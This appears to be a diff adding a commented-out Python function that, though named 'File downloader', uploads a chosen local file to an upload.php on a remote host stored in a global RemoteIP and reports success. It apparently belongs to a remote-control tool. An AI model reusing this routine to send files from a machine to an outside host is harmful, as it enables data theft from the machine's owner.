@@ -1,0 +1,10 @@
+# Function: File downloader
+#def download(fileDown):
+#	global RemoteIP
+#	url = 'http://' + RemoteIP  + '/upload.php'
+#	data = {'dir':'', 'submit':'Submit'}
+#	files = {'fileToUpload':('file', open(fileDown, 'rb'))}
+#	r = requests.post(url, data=data, files=files)
+#	print(r.content)
+#	print "File downloaded."
+#	asubmit("File [%s] downloaded from [%s] successfully." % (fileDown,RemoteIP))
